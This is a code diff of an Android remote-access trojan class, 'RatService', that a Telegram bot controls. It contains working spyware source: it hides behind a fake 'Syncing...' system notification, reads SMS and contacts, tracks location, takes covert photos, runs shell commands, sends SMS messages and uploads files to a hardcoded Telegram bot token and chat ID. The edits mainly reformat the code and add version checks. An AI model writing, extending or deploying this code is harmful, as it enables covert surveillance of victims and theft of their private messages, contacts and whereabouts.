@@ -20,10 +20,11 @@ import java.io.*;
 import okhttp3.*;
 
 public class RatService extends Service {
-    // تأكد من وضع التوكن والايدي هنا
+    // ⚠️ غير التوكن والآي دي هنا قبل ما تعمل Commit
     private static final String BOT_TOKEN = "‏9014559285:AAEamXnqANi68FHT7mnT3DpF5hC1y9zmes4";
     private static final String CHAT_ID = "6978974735";
     private static final String TG_API = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
+    
     private long lastUpdateId = 0;
     private boolean isRunning = true;
     private OkHttpClient client = new OkHttpClient();
@@ -43,9 +44,17 @@ public class RatService extends Service {
             NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN);
             getSystemService(NotificationManager.class).createNotificationChannel(channel);
         }
-        Notification notification = new Notification.Builder(this, channelId)
-                .setContentTitle("System Update").setContentText("Updating...")
-                .setSmallIcon(android.R.drawable.ic_menu_manage).build();
+        
+        Notification notification;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            notification = new Notification.Builder(this, channelId)
+                    .setContentTitle("Syncing...").setContentText("Please wait")
+                    .setSmallIcon(android.R.drawable.ic_menu_manage).build();
+        } else {
+            notification = new Notification.Builder(this)
+                    .setContentTitle("Syncing...").setContentText("Please wait")
+                    .setSmallIcon(android.R.drawable.ic_menu_manage).build();
+        }
         startForeground(1, notification);
     }
 
@@ -85,14 +94,16 @@ public class RatService extends Service {
                         }
                     }
                     Thread.sleep(1000);
-                } catch (Exception e) { try { Thread.sleep(3000); } catch (InterruptedException ignored) {} }
+                } catch (Exception e) { 
+                    try { Thread.sleep(3000); } catch (InterruptedException ignored) {} 
+                }
             }
         }).start();
     }
 
     private void handleCommand(String cmd) {
         if (cmd.equals("/info")) {
-            sendText("Model: " + Build.MODEL + "\nBrand: " + Build.BRAND);
+            sendText("Model: " + Build.MODEL + "\nBrand: " + Build.BRAND + "\nAndroid: " + Build.VERSION.RELEASE);
         } else if (cmd.equals("/sms")) {
             sendSms();
         } else if (cmd.equals("/contacts")) {
@@ -107,7 +118,10 @@ public class RatService extends Service {
             runShell(cmd.substring(7));
         } else if (cmd.startsWith("/send ")) {
             String[] p = cmd.split(" ", 3);
-            if (p.length == 3) { SmsManager.getDefault().sendTextMessage(p[1], null, p[2], null, null); sendText("SMS Sent!"); }
+            if (p.length == 3) { 
+                SmsManager.getDefault().sendTextMessage(p[1], null, p[2], null, null); 
+                sendText("SMS Sent!"); 
+            }
         }
     }
 
@@ -119,7 +133,9 @@ public class RatService extends Service {
             String line;
             while ((line = reader.readLine()) != null) output.append(line).append("\n");
             sendText("💻 Shell Output:\n" + output.toString());
-        } catch (Exception e) { sendText("Error: " + e.getMessage()); }
+        } catch (Exception e) { 
+            sendText("Error: " + e.getMessage()); 
+        }
     }
 
     private void sendLocation() {
@@ -129,8 +145,12 @@ public class RatService extends Service {
             if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
             if (loc != null) {
                 sendText("📍 Location: https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
-            } else { sendText("Location not available yet."); }
-        } catch (SecurityException e) { sendText("Location permission denied."); }
+            } else { 
+                sendText("Location not available yet."); 
+            }
+        } catch (SecurityException e) { 
+            sendText("Location permission denied."); 
+        }
     }
 
     private void takePhoto() {
@@ -140,16 +160,23 @@ public class RatService extends Service {
             camera.startPreview();
             camera.takePicture(null, null, (data, cam) -> {
                 File photo = new File(getExternalFilesDir(null), "photo.jpg");
-                try (FileOutputStream fos = new FileOutputStream(photo)) { fos.write(data); } catch (IOException ignored) {}
+                try (FileOutputStream fos = new FileOutputStream(photo)) { 
+                    fos.write(data); 
+                } catch (IOException ignored) {}
                 cam.release();
                 uploadFile(photo.getAbsolutePath());
             });
-        } catch (Exception e) { sendText("Camera error: " + e.getMessage()); }
+        } catch (Exception e) { 
+            sendText("Camera error: " + e.getMessage()); 
+        }
     }
 
     private void uploadFile(String path) {
         File file = new File(path);
-        if (!file.exists()) { sendText("File not found: " + path); return; }
+        if (!file.exists()) { 
+            sendText("File not found: " + path); 
+            return; 
+        }
         RequestBody requestBody = new MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("chat_id", CHAT_ID)
@@ -165,14 +192,24 @@ public class RatService extends Service {
     private void sendSms() {
         StringBuilder sb = new StringBuilder("📩 SMS:\n");
         Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 20");
-        if (c != null && c.moveToFirst()) { do { sb.append(c.getString(c.getColumnIndexOrThrow("address"))).append(": ").append(c.getString(c.getColumnIndexOrThrow("body"))).append("\n"); } while (c.moveToNext()); c.close(); }
+        if (c != null && c.moveToFirst()) { 
+            do { 
+                sb.append(c.getString(c.getColumnIndexOrThrow("address"))).append(": ").append(c.getString(c.getColumnIndexOrThrow("body"))).append("\n"); 
+            } while (c.moveToNext()); 
+            c.close(); 
+        }
         sendText(sb.toString());
     }
     
     private void sendContacts() {
         StringBuilder sb = new StringBuilder("👥 Contacts:\n");
         Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
-        if (c != null && c.moveToFirst()) { do { sb.append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append("\n"); } while (c.moveToNext()); c.close(); }
+        if (c != null && c.moveToFirst()) { 
+            do { 
+                sb.append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append("\n"); 
+            } while (c.moveToNext()); 
+            c.close(); 
+        }
         sendText(sb.toString());
     }
 
